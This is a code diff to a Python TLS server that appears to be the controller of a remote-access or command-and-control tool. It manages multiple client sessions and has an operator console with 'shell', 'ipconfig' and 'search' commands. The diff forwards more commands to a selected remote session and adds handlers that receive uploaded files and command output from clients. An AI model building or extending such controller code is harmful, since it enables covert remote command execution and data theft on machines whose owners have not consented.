@@ -5,6 +5,8 @@ from src.server.utils.config import logger
 from utils.file_utils import FileUtils
 from utils.socket_utils import readline
 
+from src.utils.socket_utils import read_buffer
+
 
 class TLSServer:
     def __init__(self, host: str, port: int, certfile: str, keyfile: str) -> None:
@@ -130,7 +132,7 @@ class TLSServer:
                 self._use(cmd)
 
             elif cmd == "ipconfig":
-                pass
+                self._send_to_current(cmd.encode("utf-8"))
 
             elif cmd == "help":
                 self._send_to_current(b"HELP: available commands coming soon\n")
@@ -144,6 +146,9 @@ class TLSServer:
 
             elif cmd.startswith("shell "):
                 self._shell(cmd)
+
+            elif cmd.startswith("search "):
+                self._send_to_current(cmd.encode("utf-8"))
 
             elif cmd == "exit":
                 logger.debug("Exiting admin console")
@@ -198,6 +203,17 @@ class TLSServer:
         except OSError:
             self._remove_session(sid)
 
+    def _recv_output(self):
+        with self.lock:
+            sid = self.current_session
+            sock = self.sessions.get(sid)
+
+        try:
+            logger.debug(read_buffer(sock).decode('utf-8'))
+        except OSError:
+            self._remove_session(sid)
+
+
     def _send_file(self, filename):
         import os
 
@@ -222,16 +238,20 @@ class TLSServer:
         if not sock:
             logger.debug("No session selected")
             return
-
         try:
             sock.sendall(data + b"\n")
         except OSError:
             self._remove_session(sid)
 
     def _handle_incoming_data(self, operation):
-        if operation.decode('utf-8').startswith('SEND_FILE '):
-            filename = operation.split()[1].decode("utf-8")
+        operation = operation.decode("utf-8")
+
+        if operation.startswith('SEND_FILE '):
+            filename = operation.split()[1]
             self._recv_file(filename)
+        if operation == "DISPLAY":
+            logger.debug("[*] Server displaying")
+            self._recv_output()
 
     def stop(self):
         self.running = False
